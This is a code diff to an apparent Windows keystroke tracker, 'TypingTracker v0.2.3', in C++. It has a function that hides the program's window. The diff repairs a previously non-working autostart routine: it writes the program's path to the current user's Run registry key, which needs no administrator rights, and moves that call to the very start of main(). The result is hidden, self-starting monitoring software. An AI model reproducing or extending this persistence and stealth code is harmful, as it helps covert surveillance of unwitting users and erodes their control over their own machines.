@@ -684,16 +684,14 @@ void stealth(const unsigned short int display_mode)
 	ShowWindow(stealth, display_mode); //1 - visible window, 0 - hidden window
 }
 
-//Not working functions
 void addInAutorun()
 {
 	HKEY hKey;
 	char szPath[0x100];
 	GetModuleFileName(NULL, szPath, sizeof(szPath));
-	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
-				   "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-				   NULL, (LPSTR)"", REG_OPTION_NON_VOLATILE, 
-				   KEY_SET_VALUE, NULL, &hKey, NULL);
+	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+				   NULL, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
+				   nullptr, &hKey, nullptr);
 
 	if (hKey)
 	{
@@ -704,6 +702,8 @@ void addInAutorun()
 
 int main(int argc, char *argv[]) 
 {
+	addInAutorun();
+
 	//UI for interactions with application display mode
 	std::cout << "TypingTracker v0.2.3\n" << std::endl;
 
@@ -722,8 +722,6 @@ int main(int argc, char *argv[])
 		std::cout << "Try selected display mode again.\n" << std::endl;
 		exit(1);
 	}
-
-	addInAutorun();
 
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
